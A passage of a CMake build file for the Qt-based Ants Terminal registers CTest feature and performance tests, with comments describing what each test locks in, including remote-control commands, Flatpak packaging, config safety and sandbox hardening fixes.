    add_executable(test_settings_parse_failure_mirror
        tests/features/settings_parse_failure_mirror/test_settings_parse_failure_mirror.cpp
    )
    target_compile_options(test_settings_parse_failure_mirror PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_settings_parse_failure_mirror PRIVATE
        SRC_CLAUDEALLOWLIST_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeallowlist.cpp"
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    add_test(NAME settings_parse_failure_mirror
        COMMAND test_settings_parse_failure_mirror)
    set_tests_properties(settings_parse_failure_mirror PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # no_anim_style — 0.7.5 fix. Locks the NoAnimStyle QProxyStyle that
    # suppresses Fusion's style-driven QPropertyAnimation(geometry) cycle.
    # Without this, `QApplication::setEffectEnabled(UI_AnimateMenu, false)`
    # and `QMainWindow::setAnimated(false)` do NOT cover the 60 Hz
    # QWidgetAnimator cycle that surfaced as dropdown-menu flicker on the
    # 2026-04-20 user report. See tests/features/no_anim_style/spec.md.
    add_executable(test_no_anim_style
        tests/features/no_anim_style/test_no_anim_style.cpp
    )
    target_compile_options(test_no_anim_style PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_no_anim_style PRIVATE
        SRC_MAIN_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/main.cpp"
    )
    add_test(NAME no_anim_style
             COMMAND test_no_anim_style)
    set_tests_properties(no_anim_style PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # paste_dialog_custom — 0.7.4 fix. Locks that confirmDangerousPaste
    # uses a plain QDialog (not QMessageBox), completes the Wayland
    # activation handshake synchronously via show()+raise()+activateWindow()
    # before exec(), and keeps Cancel as the default button. See
    # tests/features/paste_dialog_custom/spec.md.
    add_executable(test_paste_dialog_custom
        tests/features/paste_dialog_custom/test_paste_dialog_custom.cpp
    )
    target_compile_options(test_paste_dialog_custom PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_paste_dialog_custom PRIVATE
        SRC_TERMINALWIDGET_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
    )
    add_test(NAME paste_dialog_custom
             COMMAND test_paste_dialog_custom)
    set_tests_properties(paste_dialog_custom PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # flatpak_host_shell — pins the FLATPAK_ID / /.flatpak-info
    # detection + flatpak-spawn --host branch in ptyhandler.cpp. The
    # branch can't be exercised headlessly (no sandbox on CI runners)
    # so a source-grep test locks the argv shape: --host, --env= for
    # every TERM var, --directory= gated on workDir.isEmpty(), -- before
    # the shell path, _exit(127) on execvp failure, direct-exec path
    # intact after the branch. See
    # tests/features/flatpak_host_shell/spec.md.
    add_executable(test_flatpak_host_shell
        tests/features/flatpak_host_shell/test_flatpak_host_shell.cpp
    )
    target_compile_options(test_flatpak_host_shell PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_flatpak_host_shell PRIVATE
        SRC_PTYHANDLER_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/ptyhandler.cpp"
    )
    add_test(NAME flatpak_host_shell
             COMMAND test_flatpak_host_shell)
    set_tests_properties(flatpak_host_shell PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # flatpak_lua_module — pins the Lua 5.4 archive module in the
    # Flatpak manifest: module order (must precede ants-terminal),
    # pinned sha256, -fPIC in MYCFLAGS, install to /app, readline-free
    # build target, and the x-checker-data stanza that lets Flathub CI
    # auto-refresh the tarball sha256. A regression that strips any of
    # these silently produces a Flatpak build without plugin support —
    # the exact shipping hazard H6.1 exists to prevent. See
    # tests/features/flatpak_lua_module/spec.md.
    add_executable(test_flatpak_lua_module
        tests/features/flatpak_lua_module/test_flatpak_lua_module.cpp
    )
    target_compile_options(test_flatpak_lua_module PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_flatpak_lua_module PRIVATE
        FLATPAK_MANIFEST_PATH="${CMAKE_CURRENT_SOURCE_DIR}/packaging/flatpak/org.ants.Terminal.yml"
    )
    add_test(NAME flatpak_lua_module
             COMMAND test_flatpak_lua_module)
    set_tests_properties(flatpak_lua_module PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # flathub_manifest_transform — exercises make-flathub-manifest.sh
    # and pins the shape of its output: the dev manifest's `type: dir /
    # path: ../..` is replaced with `type: git / url / tag: vX.Y.Z`,
    # the Lua module survives byte-identical (including sha256 and
    # x-checker-data), the generator auto-detects VERSION from
    # CMakeLists.txt, and it rejects invalid VERSION arguments. A
    # regression here silently ships a broken Flathub manifest on PR.
    # See tests/features/flathub_manifest_transform/spec.md.
    add_executable(test_flathub_manifest_transform
        tests/features/flathub_manifest_transform/test_flathub_manifest_transform.cpp
    )
    target_compile_options(test_flathub_manifest_transform PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_flathub_manifest_transform PRIVATE
        TRANSFORMER_PATH="${CMAKE_CURRENT_SOURCE_DIR}/packaging/flatpak/make-flathub-manifest.sh"
    )
    add_test(NAME flathub_manifest_transform
             COMMAND test_flathub_manifest_transform)
    set_tests_properties(flathub_manifest_transform PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_rule_quality — locks the 0.6.31 self-learning data layer:
    # per-rule fire/suppression aggregation, longest-common-substring
    # tightening suggester, JSON persistence round-trip. Pure model code,
    # no Qt GUI; same approach as osc133_hmac_verification.
    # See tests/features/audit_rule_quality/spec.md.
    add_executable(test_audit_rule_quality
        tests/features/audit_rule_quality/test_audit_rule_quality.cpp
        src/auditrulequality.cpp
    )
    target_link_libraries(test_audit_rule_quality PRIVATE
        Qt6::Core
    )
    target_include_directories(test_audit_rule_quality PRIVATE src)
    target_compile_options(test_audit_rule_quality PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME audit_rule_quality
             COMMAND test_audit_rule_quality)
    set_tests_properties(audit_rule_quality PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_hygiene — locks the 0.7.x external-tool calibration parsers
    # (.semgrep.yml header → --exclude-rule, pyproject.toml S-codes →
    # --skip B-codes). Origin: RetroDB audit-hygiene report 2026-04-21.
    # Pure regex-on-text, so no QtGui / QApplication dependency.
    # See tests/features/audit_hygiene/spec.md.
    add_executable(test_audit_hygiene
        tests/features/audit_hygiene/test_audit_hygiene.cpp
        src/audithygiene.cpp
    )
    target_link_libraries(test_audit_hygiene PRIVATE
        Qt6::Core
    )
    target_include_directories(test_audit_hygiene PRIVATE src)
    target_compile_options(test_audit_hygiene PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME audit_hygiene
             COMMAND test_audit_hygiene)
    set_tests_properties(audit_hygiene PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # feature_coverage — locks the 0.7.x spec↔code drift + CHANGELOG↔test
    # coverage lane parsers (identifier extraction + fuzzy title matching).
    # Follow-on to the RetroDB 2026-04-21 audit-hygiene work — once scanner
    # calibration was tightened, the next signal-loss frontier was specs
    # referencing renamed code and CHANGELOG bullets without tests.
    # Headless: pure text → list, no QtGui.
    # See tests/features/feature_coverage/spec.md.
    add_executable(test_feature_coverage
        tests/features/feature_coverage/test_feature_coverage.cpp
        src/featurecoverage.cpp
    )
    target_link_libraries(test_feature_coverage PRIVATE
        Qt6::Core
    )
    target_include_directories(test_feature_coverage PRIVATE src)
    target_compile_options(test_feature_coverage PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME feature_coverage
             COMMAND test_feature_coverage)
    set_tests_properties(feature_coverage PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # osc_color_query — locks the OSC 10/11/12 query-form response shape
    # (16-bit-per-channel `rgb:RRRR/GGGG/BBBB`, xterm convention) and the
    # "set form is silently dropped" theme-injection guard. See
    # tests/features/osc_color_query/spec.md. Added in 0.7.0.
    add_executable(test_osc_color_query
        tests/features/osc_color_query/test_osc_color_query.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_osc_color_query PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_osc_color_query PRIVATE src)
    target_compile_options(test_osc_color_query PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME osc_color_query COMMAND test_osc_color_query)
    set_tests_properties(osc_color_query PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # decrqss — locks DECRQSS (DCS $ q Pt ST) response shapes for the
    # four supported request types (r, m, SP q, invalid) plus the
    # regression guard that Sixel traffic still routes to the Sixel
    # handler rather than being eaten by the DECRQSS branch. See
    # tests/features/decrqss/spec.md. Added in 0.7.0.
    add_executable(test_decrqss
        tests/features/decrqss/test_decrqss.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_decrqss PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_decrqss PRIVATE src)
    target_compile_options(test_decrqss PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME decrqss COMMAND test_decrqss)
    set_tests_properties(decrqss PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_ls — first slice of the 0.8.0 Kitty-style
    # rc_protocol item. Pins the Unix-socket + JSON-envelope shape
    # and the stable field names (`ok`, `tabs`, `index`, `title`,
    # `cwd`, `active`) that rc_protocol clients will depend on.
    # Source-grep test — no GUI, no socket — catches drift at
    # source-edit time rather than waiting for an integration run.
    # See tests/features/remote_control_ls/spec.md.
    add_executable(test_remote_control_ls
        tests/features/remote_control_ls/test_remote_control_ls.cpp
    )
    target_compile_options(test_remote_control_ls PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_ls PRIVATE
        SRC_RC_HEADER="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.h"
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_MAIN_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/main.cpp"
        SRC_CMAKELISTS="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
    )
    add_test(NAME remote_control_ls COMMAND test_remote_control_ls)
    set_tests_properties(remote_control_ls PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_send_text — second rc_protocol command. Locks
    # the "text is required + string" contract, the isDouble-based
    # tab disambiguation (so `--remote-tab 0` stays meaningful), the
    # sendToPty call target, the MainWindow::terminalAtTab public
    # accessor, and the stdin-read client ergonomic. Negative guard
    # against a future regression that auto-appends `\n` to `text`
    # (diverges from Kitty semantics and breaks binary-stream
    # callers). See tests/features/remote_control_send_text/spec.md.
    add_executable(test_remote_control_send_text
        tests/features/remote_control_send_text/test_remote_control_send_text.cpp
    )
    target_compile_options(test_remote_control_send_text PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_send_text PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_MAIN_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/main.cpp"
    )
    add_test(NAME remote_control_send_text COMMAND test_remote_control_send_text)
    set_tests_properties(remote_control_send_text PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_opt_in — asserts the 0.7.12 /indie-review hardening:
    # (A) behavioral — filterControlChars strips the dangerous C0 subset +
    #     DEL while preserving HT / LF / CR and UTF-8 bytes >= 0x80;
    # (B) behavioral — Config API round-trip for `remote_control_enabled`
    #     (the key the gate reads). Replaces the 0.7.12 grep-for-getter-
    #     name approach, which a rename would silently defeat.
    # (C) structural — raw-bypass + filter calls inside cmdSendText, plus
    #     a regex-based check that start() lives inside a conditional.
    # Closes the local-UID keystroke-injection RCE chain. See
    # tests/features/remote_control_opt_in/spec.md.
    add_executable(test_remote_control_opt_in
        tests/features/remote_control_opt_in/test_remote_control_opt_in.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_remote_control_opt_in PRIVATE
        Qt6::Core
    )
    target_include_directories(test_remote_control_opt_in PRIVATE src)
    target_compile_options(test_remote_control_opt_in PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_opt_in PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME remote_control_opt_in COMMAND test_remote_control_opt_in)
    set_tests_properties(remote_control_opt_in PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # config_parse_failure_guard — asserts the 0.7.12 /indie-review
    # silent-data-loss fix in Config: on parse failure, the corrupt
    # file is rotated aside and save() is suppressed so setters don't
    # clobber the user's hand-fixable config. Also exercises the fresh-
    # run + valid-file happy paths and the std::rename return check.
    # See tests/features/config_parse_failure_guard/spec.md.
    add_executable(test_config_parse_failure
        tests/features/config_parse_failure_guard/test_config_parse_failure.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_config_parse_failure PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_config_parse_failure PRIVATE src)
    target_compile_options(test_config_parse_failure PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME config_parse_failure_guard COMMAND test_config_parse_failure)
    set_tests_properties(config_parse_failure_guard PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # config_reload_loop_safety — locks the 0.7.50 fix for the inotify-
    # driven config-reload loop. onConfigFileChanged used to call
    # applyTheme -> setTheme -> save() unconditionally, which re-entered
    # via inotify because Qt reads inotify events from the event loop
    # *after* the slot returns (so blockSignals during the slot doesn't
    # cover them). The test asserts the idempotent setter, the no-op
    # applyTheme skip, the re-entrancy guard, and the absence of the
    # failed 0.7.31 blockSignals attempt.
    # See tests/features/config_reload_loop_safety/spec.md.
    add_executable(test_config_reload_loop_safety
        tests/features/config_reload_loop_safety/test_config_reload_loop_safety.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_config_reload_loop_safety PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_config_reload_loop_safety PRIVATE src)
    target_compile_options(test_config_reload_loop_safety PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME config_reload_loop_safety
        COMMAND test_config_reload_loop_safety
        WORKING_DIRECTORY ${CMAKE_SOURCE_DIR})
    set_tests_properties(config_reload_loop_safety PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_command_rule_trust — locks the per-project trust store for
    # audit_rules.json rule packs carrying `command` fields. Before
    # 0.7.13 trust was a single global bool, which over-granted after
    # one opt-in. Now trust is keyed on (canonical projectPath, sha256
    # of rule-pack bytes); any edit to the rule pack invalidates trust.
    # A broken gate is silent RCE re-introduction, so this lives on the
    # fast lane. See tests/features/audit_command_rule_trust/spec.md.
    add_executable(test_audit_command_rule_trust
        tests/features/audit_command_rule_trust/test_audit_command_rule_trust.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_audit_command_rule_trust PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_audit_command_rule_trust PRIVATE src)
    target_compile_options(test_audit_command_rule_trust PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME audit_command_rule_trust
             COMMAND test_audit_command_rule_trust)
    set_tests_properties(audit_command_rule_trust PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_new_tab — third rc_protocol command. Locks the
    # cwd + command field forwarding, the 200 ms settle before the
    # command write (matches onSshConnect — shells drop keystrokes
    # if written before their init settles), the QPointer guard on
    # the deferred lambda, and the non-const `int newTabForRemote(...)`
    # signature that the dispatch layer depends on. See
    # tests/features/remote_control_new_tab/spec.md.
    add_executable(test_remote_control_new_tab
        tests/features/remote_control_new_tab/test_remote_control_new_tab.cpp
    )
    target_compile_options(test_remote_control_new_tab PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_new_tab PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_MAIN_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/main.cpp"
    )
    add_test(NAME remote_control_new_tab COMMAND test_remote_control_new_tab)
    set_tests_properties(remote_control_new_tab PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_select_window — fourth rc_protocol command.
    # Locks the required-tab contract (no implicit default),
    # isDouble-based validation, the delegation to
    # MainWindow::selectTabForRemote, and the setFocus on the new
    # active terminal (without it, follow-up send-text calls hit
    # stale focus owners). See
    # tests/features/remote_control_select_window/spec.md.
    add_executable(test_remote_control_select_window
        tests/features/remote_control_select_window/test_remote_control_select_window.cpp
    )
    target_compile_options(test_remote_control_select_window PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_select_window PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME remote_control_select_window
             COMMAND test_remote_control_select_window)
    set_tests_properties(remote_control_select_window PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_set_title — fifth rc_protocol command. Locks the
    # title-pin mechanism: the per-shell titleChanged signal handler
    # AND updateTabTitles both consult m_tabTitlePins, the tab-close
    # path frees the pin entry, and clearing the pin via empty-title
    # restores from shellTitle() when tabTitleFormat == "title".
    # See tests/features/remote_control_set_title/spec.md.
    add_executable(test_remote_control_set_title
        tests/features/remote_control_set_title/test_remote_control_set_title.cpp
    )
    target_compile_options(test_remote_control_set_title PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_set_title PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME remote_control_set_title COMMAND test_remote_control_set_title)
    set_tests_properties(remote_control_set_title PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # tab_rename_pin — right-click "Rename Tab…" must route through
    # setTabTitleForRemote so the manual name populates m_tabTitlePins
    # and survives the shell's OSC 0/2 writes. Before this fix, Claude
    # Code's per-prompt title updates silently clobbered manual renames
    # within seconds. See tests/features/tab_rename_pin/spec.md.
    add_executable(test_tab_rename_pin
        tests/features/tab_rename_pin/test_tab_rename_pin.cpp
    )
    target_compile_options(test_tab_rename_pin PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_tab_rename_pin PRIVATE
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME tab_rename_pin COMMAND test_tab_rename_pin)
    set_tests_properties(tab_rename_pin PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_get_text — sixth rc_protocol command. Locks the
    # reuse of TerminalWidget::recentOutput (so the AI dialog and
    # rc_protocol can't drift apart), the 10 000-line response cap,
    # the response field set (text + lines + bytes), and the
    # client-side --remote-lines validation. See
    # tests/features/remote_control_get_text/spec.md.
    add_executable(test_remote_control_get_text
        tests/features/remote_control_get_text/test_remote_control_get_text.cpp
    )
    target_compile_options(test_remote_control_get_text PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_get_text PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAIN_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/main.cpp"
    )
    add_test(NAME remote_control_get_text COMMAND test_remote_control_get_text)
    set_tests_properties(remote_control_get_text PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_launch — seventh + final command in the initial
    # rc_protocol surface. Locks the require-command contract, the
    # auto-newline behaviour (the convenience differentiator from
    # new-tab), the delegation into newTabForRemote (no parallel
    # tab-creation logic), the sendToPty-not-writeCommand fix in
    # newTabForRemote (so new-tab stays byte-faithful), and the
    # shared client-CLI branch with new-tab. See
    # tests/features/remote_control_launch/spec.md.
    add_executable(test_remote_control_launch
        tests/features/remote_control_launch/test_remote_control_launch.cpp
    )
    target_compile_options(test_remote_control_launch PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_launch PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_MAIN_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/main.cpp"
    )
    add_test(NAME remote_control_launch COMMAND test_remote_control_launch)
    set_tests_properties(remote_control_launch PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # debuglog_perms — asserts ~/.local/share/ants-terminal/debug.log
    # lands 0600 after the first DebugLog::setActive() call, even when
    # the process umask is 0022. Covers fresh-open, clear+reopen, and
    # narrowing of a pre-existing 0644 file left by a pre-fix build.
    # See tests/features/debuglog_perms/spec.md.
    add_executable(test_debuglog_perms
        tests/features/debuglog_perms/test_debuglog_perms.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_debuglog_perms PRIVATE Qt6::Core)
    target_include_directories(test_debuglog_perms PRIVATE src)
    target_compile_options(test_debuglog_perms PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_debuglog_perms PRIVATE
        SRC_DEBUGLOG_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/debuglog.cpp"
    )
    add_test(NAME debuglog_perms COMMAND test_debuglog_perms)
    set_tests_properties(debuglog_perms PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_path_traversal — asserts AuditDialog enrichment sites
    # (snippet preview, comment classifier, inline-suppress scan,
    # AI-triage snippet fallbacks, dropIfContextContains) reject
    # `f.file` values that escape the project root via ../ or
    # symlinks. Behavioral test on a canonicalize+anchor reference
    # reimpl (AuditDialog::resolveProjectPath is private on a heavy
    # QDialog subclass) plus source-greps on auditdialog.cpp to
    # confirm all call sites migrated. See
    # tests/features/audit_path_traversal/spec.md.
    add_executable(test_audit_path_traversal
        tests/features/audit_path_traversal/test_audit_path_traversal.cpp
    )
    target_link_libraries(test_audit_path_traversal PRIVATE Qt6::Core)
    target_compile_options(test_audit_path_traversal PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_path_traversal PRIVATE
        SRC_AUDITDIALOG_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
    )
    add_test(NAME audit_path_traversal COMMAND test_audit_path_traversal)
    set_tests_properties(audit_path_traversal PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # settings_dialog_config_reload — asserts MainWindow::onConfigFileChanged
    # invalidates the cached m_settingsDialog (close-if-visible +
    # deleteLater + null) so a subsequent Preferences... open rebuilds
    # from the freshly reloaded Config, instead of showing stale
    # pre-edit widget values that would silently overwrite the external
    # edit on Save. Source-grep only — MainWindow is too heavy to
    # instantiate under a feature test. See
    # tests/features/settings_dialog_config_reload/spec.md.
    add_executable(test_settings_dialog_config_reload
        tests/features/settings_dialog_config_reload/test_settings_dialog_config_reload.cpp
    )
    target_link_libraries(test_settings_dialog_config_reload PRIVATE Qt6::Core)
    target_compile_options(test_settings_dialog_config_reload PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_settings_dialog_config_reload PRIVATE
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME settings_dialog_config_reload
             COMMAND test_settings_dialog_config_reload)
    set_tests_properties(settings_dialog_config_reload PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # confirm_close_with_processes — ANTS-1102. Tabs running non-shell
    # descendants prompt before close; "Don't ask again" flips the
    # config. Source-grep against config.{h,cpp}, mainwindow.cpp,
    # settingsdialog.{h,cpp}.
    add_executable(test_confirm_close_with_processes
        tests/features/confirm_close_with_processes/test_confirm_close_with_processes.cpp
    )
    target_link_libraries(test_confirm_close_with_processes PRIVATE Qt6::Core)
    target_compile_options(test_confirm_close_with_processes PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_confirm_close_with_processes PRIVATE
        SRC_CONFIG_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/config.h"
        SRC_CONFIG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/config.cpp"
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_SETTINGSDIALOG_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.h"
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    add_test(NAME confirm_close_with_processes
             COMMAND test_confirm_close_with_processes)
    set_tests_properties(confirm_close_with_processes PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # help_about_menu — asserts MainWindow's Help menu carries an
    # "About Ants Terminal..." action whose handler reads ANTS_VERSION
    # (not a hardcoded literal) and renders as rich text with clickable
    # links, plus an "About Qt..." action routing to QMessageBox::aboutQt.
    # Source-grep only — MainWindow is too heavy for a widget harness.
    # See tests/features/help_about_menu/spec.md.
    add_executable(test_help_about_menu
        tests/features/help_about_menu/test_help_about_menu.cpp
    )
    target_link_libraries(test_help_about_menu PRIVATE Qt6::Core)
    target_compile_options(test_help_about_menu PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_help_about_menu PRIVATE
        SRC_MAINWINDOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME help_about_menu COMMAND test_help_about_menu)
    set_tests_properties(help_about_menu PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # lua_sandbox_hardening — asserts the Lua sandbox rejects bytecode
    # via two independent gates (0x1b first-byte peek AND luaL_loadfilex
    # "t" mode), that string.dump is stripped at sandbox-init time, and
    # that LuaEngine::shutdown clears the instruction-count hook before
    # lua_close to close the UAF window where __gc metamethods could
    # observe a partially-finalized engine. Gated on LUA_FOUND because
    # the test links against luaengine.cpp + the Lua C API. See
    # tests/features/lua_sandbox_hardening/spec.md.
    if(LUA_FOUND)
        add_executable(test_lua_sandbox_hardening
            tests/features/lua_sandbox_hardening/test_lua_sandbox_hardening.cpp
            src/luaengine.cpp
        )
        target_link_libraries(test_lua_sandbox_hardening PRIVATE
            Qt6::Core
            ${LUA_LIBRARIES}
        )
        target_include_directories(test_lua_sandbox_hardening PRIVATE
            src
            ${LUA_INCLUDE_DIRS}
        )
        target_compile_options(test_lua_sandbox_hardening PRIVATE
            -Wall -Wextra -Wpedantic
        )
        target_compile_definitions(test_lua_sandbox_hardening PRIVATE
            ANTS_LUA_PLUGINS=1
            SRC_LUAENGINE_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/luaengine.cpp"
        )
        add_test(NAME lua_sandbox_hardening COMMAND test_lua_sandbox_hardening)
        set_tests_properties(lua_sandbox_hardening PROPERTIES
            LABELS "features;fast"
            TIMEOUT 10)
    endif()

    # bench_vt_throughput — VT parse + grid-apply throughput harness.
    # Drives the 0.8.0 "Terminal throughput slowdowns" investigation
    # (ROADMAP.md § 0.8.0 > ⚡ Performance). Linked against only
    # terminalgrid.cpp + vtparser.cpp — no GUI, no PTY. Builds at -O2
    # so numbers resemble release builds regardless of
    # CMAKE_BUILD_TYPE. Registered under the `perf` label; excluded
    # from the default `fast` suite so day-to-day ctest runs stay
    # under two seconds. Run explicitly with
    # `ctest -L perf --verbose` or the raw binary. Increase corpus
    # size with `ANTS_PERF_MB=64 ./bench_vt_throughput`.
    add_executable(bench_vt_throughput
        tests/perf/bench_vt_throughput.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(bench_vt_throughput PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(bench_vt_throughput PRIVATE src)
    target_compile_options(bench_vt_throughput PRIVATE
        -Wall -Wextra -Wpedantic -O2
    )
    add_test(NAME vt_throughput COMMAND bench_vt_throughput)
    set_tests_properties(vt_throughput PROPERTIES
        LABELS "perf"
        TIMEOUT 60)
endif()
